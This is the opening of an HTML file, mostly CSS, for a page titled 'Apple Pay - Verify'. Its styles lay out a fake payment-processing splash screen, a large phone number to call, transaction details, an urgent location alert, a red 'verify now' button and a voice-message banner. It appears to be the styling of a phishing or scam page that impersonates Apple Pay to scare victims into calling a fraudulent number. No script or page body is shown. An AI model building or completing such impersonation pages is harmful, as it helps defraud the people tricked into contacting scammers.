
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Apple Pay - Verify</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #000;
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px;
            margin: 0;
            -webkit-tap-highlight-color: transparent;
            overflow: hidden;
            overscroll-behavior: contain;
            position: fixed;
            width: 100%;
            height: 100%;
            height: 100dvh;
        }

        /* ---------- SPLASH ---------- */
        #splashScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            height: 100dvh;
            background: #0b0b0e;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            transition: opacity 0.5s ease, visibility 0.5s;
            padding: 20px;
            backdrop-filter: blur(2px);
            padding-top: env(safe-area-inset-top);
            padding-bottom: env(safe-area-inset-bottom);
        }
        #splashScreen.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        .splash-card {
            max-width: 380px;
            width: 100%;
            background: #1c1c1e;
            border-radius: 48px;
            padding: 32px 24px 40px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
            text-align: center;
            border: 1px solid #2c2c2e;
            animation: floatIn 0.6s ease;
        }
        @keyframes floatIn {
            0% { transform: translateY(20px); opacity: 0.6; }
            100% { transform: translateY(0); opacity: 1; }
        }
        .splash-card .apple-pay-badge {
            font-size: 26px;
            font-weight: 600;
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #f5f5f7;
            margin-bottom: 12px;
        }
        .splash-card .apple-pay-badge i {
            font-size: 28px;
            color: #f5f5f7;
        }
        .splash-card .processing-text {
            font-size: 17px;
            font-weight: 500;
            color: #aeaeb2;
            margin: 6px 0 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .splash-card .amount-splash {
            font-size: 48px;
            font-weight: 700;
            letter-spacing: -1px;
            color: #f5f5f7;
            margin: 8px 0 4px;
        }
        .splash-card .sub-splash {
            color: #8e8e93;
            font-size: 16px;
            margin: 4px 0 14px;
        }
        .splash-card .face-id {
            background: #2c2c2e;
            border-radius: 60px;
            padding: 14px 20px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            font-weight: 500;
            color: #f5f5f7;
            margin: 10px 0 14px;
            border: 1px solid #3a3a3c;
        }
        .splash-card .face-id i {
            font-size: 22px;
            color: #007aff;
        }
        .splash-card .tx-id {
            background: #2c2c2e;
            padding: 12px 16px;
            border-radius: 30px;
            font-size: 15px;
            color: #aeaeb2;
            border: 1px solid #3a3a3c;
            margin-top: 6px;
        }
        .spinner {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(0, 122, 255, 0.25);
            border-top: 3px solid #007aff;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ---------- POPUP OVERLAY ---------- */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            height: 100dvh;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            padding: 12px;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.4s ease, visibility 0.4s;
            overscroll-behavior: contain;
            padding-top: env(safe-area-inset-top);
            padding-bottom: env(safe-area-inset-bottom);
            padding-left: env(safe-area-inset-left);
            padding-right: env(safe-area-inset-right);
        }
        .popup-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        /* card - full screen mobile experience */
        .card {
            max-width: 420px;
            width: 100%;
            max-height: 95vh;
            max-height: 95dvh;
            background: #1c1c1e;
            border-radius: 40px;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
            padding: 20px 18px 24px;
            border: 1px solid #2c2c2e;
            transform: scale(0.92) translateY(10px);
            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.35s;
            opacity: 0;
            position: relative;
            color: #f5f5f7;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }
        .popup-overlay.active .card {
            transform: scale(1) translateY(0);
            opacity: 1;
        }
        .card::-webkit-scrollbar {
            width: 0px;
            background: transparent;
        }

        /* ---------- PAGE SYSTEM ---------- */
        .page {
            display: none;
            flex-direction: column;
            animation: fadeSlide 0.3s ease;
        }
        .page.active {
            display: flex;
        }
        @keyframes fadeSlide {
            0% { opacity: 0; transform: translateY(8px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        /* Page 1 - Phone Number */
        .phone-number-display {
            text-align: center;
            padding: 20px 0 12px;
        }
        .phone-number-display .label {
            color: #8e8e93;
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 6px;
        }
        .phone-number-display .number {
            font-size: 32px;
            font-weight: 700;
            color: #f5f5f7;
            letter-spacing: 1px;
            background: #2c2c2e;
            padding: 12px 20px;
            border-radius: 60px;
            display: inline-block;
            border: 1px solid #3a3a3c;
        }
        .phone-number-display .number i {
            color: #007aff;
            margin-right: 10px;
        }
        .phone-number-display .number a {
            color: #f5f5f7;
            text-decoration: none;
        }
        .phone-number-display .number a:active {
            opacity: 0.7;
        }
        .phone-number-display .sub-text {
            color: #8e8e93;
            font-size: 13px;
            margin-top: 10px;
        }

        .nav-buttons {
            display: flex;
            gap: 12px;
            margin-top: 16px;
        }
        .nav-btn {
            flex: 1;
            padding: 14px;
            border-radius: 60px;
            border: none;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: 0.15s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .nav-btn:active {
            transform: scale(0.97);
        }
        .nav-btn.primary {
            background: #007aff;
            color: white;
        }
        .nav-btn.primary:active {
            background: #0066d9;
        }
        .nav-btn.secondary {
            background: #2c2c2e;
            color: #f5f5f7;
            border: 1px solid #3a3a3c;
        }
        .nav-btn.secondary:active {
            background: #3a3a3c;
        }
        .nav-btn.danger {
            background: #ff3b30;
            color: white;
        }
        .nav-btn.danger:active {
            background: #d70015;
        }

        /* ---------- COMPACT STYLES (Page 2) ---------- */
        .apple-pay-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 8px;
        }
        .apple-pay-header .logo {
            font-size: 18px;
            font-weight: 600;
            letter-spacing: -0.5px;
            color: #f5f5f7;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .apple-pay-header .logo i {
            font-size: 20px;
            color: #f5f5f7;
        }
        .status-badge {
            background: #2c2c2e;
            padding: 3px 10px;
            border-radius: 40px;
            font-size: 11px;
            font-weight: 500;
            color: #aeaeb2;
            border: 1px solid #3a3a3c;
        }
        .amount {
            font-size: 30px;
            font-weight: 700;
            letter-spacing: -1px;
            color: #f5f5f7;
            margin: 2px 0 0px;
            display: flex;
            align-items: baseline;
        }
        .amount small {
            font-size: 16px;
            font-weight: 500;
            color: #8e8e93;
            margin-left: 4px;
        }
        .sub-line {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #aeaeb2;
            font-size: 13px;
            font-weight: 400;
            margin-bottom: 6px;
            border-bottom: 1px solid #2c2c2e;
            padding-bottom: 6px;
        }
        .sub-line i {
            color: #007aff;
            font-size: 14px;
        }
        .tx-row {
            display: flex;
            justify-content: space-between;
            background: #2c2c2e;
            padding: 8px 12px;
            border-radius: 16px;
            margin: 4px 0 6px;
            font-size: 12px;
            font-weight: 500;
            color: #f5f5f7;
            border: 1px solid #3a3a3c;
        }
        .tx-row span:last-child {
            color: #aeaeb2;
            font-weight: 400;
        }
        .tx-detail {
            background: #2c2c2e;
            border-radius: 16px;
            padding: 8px 12px;
            margin: 4px 0 8px;
            border: 1px solid #3a3a3c;
        }
        .tx-detail .row {
            display: flex;
            justify-content: space-between;
            padding: 4px 0;
            font-size: 12px;
            border-bottom: 1px solid #3a3a3c;
        }
        .tx-detail .row:last-child {
            border-bottom: none;
        }
        .tx-detail .row .label {
            color: #8e8e93;
        }
        .tx-detail .row .value {
            font-weight: 500;
            color: #f5f5f7;
        }
        .tx-detail .row .value.completed {
            color: #34c759;
        }

        .free-badge {
            display: flex;
            justify-content: center;
            gap: 12px;
            color: #8e8e93;
            font-size: 11px;
            font-weight: 400;
            margin-bottom: 6px;
        }

        .alert-box {
            background: #2c1c1a;
            border-left: 5px solid #ff9500;
            border-radius: 14px;
            padding: 8px 12px;
            margin: 6px 0 6px;
            border: 1px solid #3a2a28;
        }
        .alert-box .title {
            display: flex;
            align-items: center;
            gap: 5px;
            font-weight: 700;
            font-size: 14px;
            color: #f5f5f7;
            margin-bottom: 2px;
        }
        .alert-box .title i {
            color: #ff9500;
            font-size: 15px;
        }
        .alert-box p {
            color: #d1d1d6;
            font-size: 12px;
            line-height: 1.3;
            margin-bottom: 2px;
        }
        .alert-box .location {
            font-size: 11px;
            color: #aeaeb2;
            background: #3a2a28;
            padding: 1px 10px;
            border-radius: 30px;
            display: inline-block;
            margin: 2px 0 2px;
        }
        .verify-now {
            background: #ff3b30;
            color: white;
            border: none;
            border-radius: 60px;
            padding: 8px 14px;
            font-weight: 600;
            font-size: 13px;
            width: 100%;
            margin: 4px 0 2px;
            transition: 0.15s;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .verify-now:active {
            background: #d70015;
            transform: scale(0.97);
        }

        .support-msg {
            text-align: center;
            font-weight: 500;
            font-size: 13px;
            color: #f5f5f7;
            margin: 4px 0 2px;
        }
        .secure-footer {
            display: flex;
            justify-content: center;
            gap: 10px;
            color: #8e8e93;
            font-size: 11px;
            margin-top: 10px;
            border-top: 1px solid #2c2c2e;
            padding-top: 10px;
        }
        .secure-footer i {
            margin-right: 3px;
        }
        .voice-message-banner {
            background: #2c2c2e;
            border-radius: 60px;
            padding: 6px 12px;
            color: #f5f5f7;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 4px 0 4px;
            border: 1px solid #3a3a3c;
            cursor: default;
        }
        .voice-message-banner .left {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .voice-message-banner .left i {
            color: #ffcc00;
            font-size: 14px;
        }
        .voice-message-banner .left .msg {
            font-weight: 400;
            font-size: 12px;
        }
        .voice-message-banner .badge {
            background: #ff3b30;
            border-radius: 30px;
            padding: 1px 8px;
            font-size: 10px;
            font-weight: 600;
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.7; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.05); }
            100% { opacity: 0.7; transform: scale(1); }
        }
        .voice-play-btn {
            background: #007aff;
            border: none;
            color: white;
            padding: 5px 12px;
            border-radius: 40px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: 0.15s;
        }
        .voice-play-btn:active {
            background: #0066d9;
            transform: scale(0.96);
        }
        .voice-container {
            background: #2c2c2e;
            border-radius: 30px;
            padding: 6px 12px;
            margin: 4px 0 6px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
            border: 1px solid #3a3a3c;
        }
        .voice-container i {
            color: #007aff;
            font-size: 16px;
        }
        .voice-container .msg-text {
            font-weight: 500;
            flex: 1;
            color: #f5f5f7;
            font-size: 13px;
        }
        .text-small {
            font-size: 10px;
            color: #8e8e93;
            text-align: center;
            margin-top: 4px;
        }

        @media (max-width: 480px) {
            .card {
                padding: 16px 14px 18px;
                border-radius: 32px;
                max-height: 92vh;
                max-height: 92dvh;
            }
            .amount {
                font-size: 26px;
            }
            .phone-number-display .number {
                font-size: 26px;
                padding: 10px 16px;
            }
            .nav-btn {
                font-size: 14px;
                padding: 12px;
            }
            .voice-container {
                padding: 5px 10px;
            }
            .voice-play-btn {
                padding: 4px 10px;
                font-size: 11px;
            }
            .alert-box {
                padding: 6px 10px;
            }
            .alert-box .title {
                font-size: 13px;
            }
            .alert-box p {
                font-size: 11px;
            }
        }
        @media (max-width: 380px) {
            .card {
                padding: 12px 10px 14px;
                border-radius: 28px;
            }
            .amount {
                font-size: 22px;
            }
            .tx-row {
                font-size: 11px;
                padding: 6px 8px;
            }
            .phone-number-display .number {
                font-size: 22px;
                padding: 8px 14px;
            }
            .nav-btn {
                font-size: 13px;
                padding: 10px;
            }
        }
        @supports (padding: max(0px)) {
            .card {
                padding-left: max(18px, env(safe-area-inset-left));
                padding-right: max(18px, env(safe-area-inset-right));
            }
        }
    </style>
